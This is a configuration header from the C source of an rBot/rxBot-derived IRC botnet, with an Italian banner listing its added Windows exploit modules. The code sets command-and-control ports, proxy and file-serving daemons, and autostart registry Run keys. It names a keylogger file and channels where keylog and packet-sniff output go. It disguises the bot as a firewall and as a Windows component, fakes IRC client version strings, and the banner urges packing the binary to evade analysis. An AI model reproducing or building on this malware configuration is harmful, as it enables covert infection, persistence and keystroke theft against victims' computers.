/*
	 ___________________________________________________
	|																|
	|	Greetz to:													|
	|			x0n3-h4ck											|
	|			rBot Author											|
	|																|
	|	Fuckz to:													|
	|			All the lamerz that use rBot and then				|
	|			say "I'm An Hacker" around.							|
	|																|
	|___________________________________Expanders and SiNaPsE_______|

                                          Rbot x0n3-Satan Moddato Da CorryL

	  Evitate di lamerizzare, quando passo qualcosa a pochi � perche ancora non lo deve avere nessuno
	  o perch� � in fase di test. 
	  decider� io quando farlo avere... questa  � l'ultima volta che passo qualcosa in anteprima.
	  
	  Questo rxbot ha modifiche sulla versione gia in rete di DoS (UrxBot) con modifiche sostanziali
	  ed eliminazione di vari bug che presentava con l'aggiunta di 1 nuovo exploit wkssvc.
	  In futuro presenter� altre release credo a un cerchio ristretto di persone.
	  
	                                                                             by SiNaPsE
	                                                                             
COMANDI PRINCIPALI:
gli scanner son rimasti invariati cambiano solo 
download ----> scarica
update   ----> aggiorna
remove   ----> butta

Modifiche apportate By CorryL
Path ftpd
Inserimento modulo ScanAll personalizabile
Path iis5ssl
Dcom Fixato
Lsass porte 445,135,139
Lsass2 porta 445
Path mssql

 
Vi consiglio vivamente di criptare il vostro .exe tramite il software ExeStealth2.exe in questo modo non
riusciranno a decompilare il vostro exe.	                                                                             
*/



// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 7000;				// backup server port
int socks4port = 1980;			// Port # for sock4 daemon to run on  -
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 84;			// Port # for http daemon to run on
int rloginport = 5004;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\r0fl.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "r0x";						// bot id
char version[] = "[rBot x0n3-Satan v 1.0 By CorryL {x0n3 will Never Die}]";		// SE LO MODIFICATE SAPPIATE CHE NON FARETE ALTRO CHE LAMERIZZARE SU CHI CI METTE TEMPO A FARLO ! :S
char password[] = "";					// bot password
char server[] = "";		               // server
char serverpass[] = "";						// server password
char channel[] = "";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "wins.exe";			// destination file name
char keylogfile[] = "Allarm.txt";				// keylog filename
char valuename[] = "Sygate Personal Firewall";		// value name for autostart
char nickconst[] = "Microsoft� Windows� Operating System";					// first part to the bot's nick
char szLocalPayloadFile[]="msconf.dat";	// Payload filename
char modeonconn[] = "-x";					// Can be more than one mode and contain both + and -
char exploitchan[] = "";					// Channel where exploit messages get redirected
char keylogchan[] = "";						// Channel where keylog messages get redirected
char psniffchan[] = "";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*",
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.03 Khaled Mardam-Bey",
	"BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!",
	"..(argon/1g) :bitchx-75 : Keep it to yourself!",
	"BitchX-70alpha14+tcl by panasync - Linux 2.0.27  Keep it to yourself!",
	"BitchX-1.0c19+ by panasync - FreeBSD 4.10-BETA : Keep it to yourself!",
	"BitchX-74p2+1.3f/SunOS 5.6 :(c)rackrock/bX [3.0.1�8] : Keep it to yourself!",
	"BitchX-1.0c18+ by panasync - IRIX 6.5.10 Silicon Graphics : Keep it to yourself!",
	"[bx.75p1] linux 2.0.36 [embryonic.22b3] :what is this that stands before me",
	"ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations.",
	"ircII EPIC4pre2 SunOS 5.6 - cypher(beta\\one) -myd!nas :one step closer to world domination",
	"ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)",
	"ircII 2.8.2 SunOS 5.6 :ircii 2.8: almost there...",
	"ircII 2.9_base OSF1 V4.0 :ircii 2.8: almost there...",
	"xchat 1.8.10 Linux 2.4.25p1mp [i686/501MHz]",
	"ircN 7.27 + 7.0 - everyone i know goes away in the end -",
	"irssi v0.8.4 - running on Linux i686",
	"mIRC32 v5.71 K.Mardam-Bey",
	"mIRC32 v5.82 K.Mardam-Bey",
	"mIRC32 v6.01 K.Mardam-Bey",
	"mIRC32 v6.03 K.Mardam-Bey",
	"mIRC32 v6.12 K.Mardam-Bey",
	"mIRC v5.71 K.Mardam-Bey",
	"mIRC v5.82 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
	"mIRC v6.1 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
	"mIRC v6.10 K.Mardam-Bey",
	"mIRC v6.12 K.Mardam-Bey",
	"mIRC v6.14 K.Mardam-Bey",
	"mIRC32 v1.0 K .Mardam-Bey",
	"eggdrop v1.6.15",
	"eggdrop v1.6.13",
	"StormBot.TCL 3.1.beta.2.10 by Xone & Domino (coders@stormbot.org)",
	"C++ based IRC Client by Jumpincow/shaxxxa/mo00",
	"HydraIRC v0.3.133-Test (14/March/2004) by Dominic Clifton aka Hydra - #HydraIRC on EFNet",
	"WSIRC 2.03-R - CopyRight 1994, 1995 Caesar M Samsi csamsi@clark.net TEXT CHANNEL",
	"ircN 6.03 for mIRC - are we being punished for fate -",
	"ircN 7.0rc.6 + 7.0rc.5 + 7.0rc.4 for mIRC - the devils of truth steal the souls of the free -",
	"osiris-1c/bitchx-75p1 + autobot(bx) p3x3 : that time then and once again..",
	"xircon[b4] + doot.3b[pawt] be-two + anony(v1) + aolsay(impulse) + deepthought + saq(dbg)",
	"AmIRC/AmigaOS 2.0.4 by Oliver Wagner <owagner@vapor.com> : http://www.vapor.com/ : [#0000D63F] : The slow mess client",
	"Quarterdeck Global Chat 1.2.9 for Macintosh",
	"Ircle 3.0b10 US PPC 12/15/1997 21:07:34 PM. #239C23AF21B",
	"Eggdrop 1.3.24i (c)1997 Robey Pointer",
	"JPilot IRC Java Client 2.32",
};


char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "IaMaNoob"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
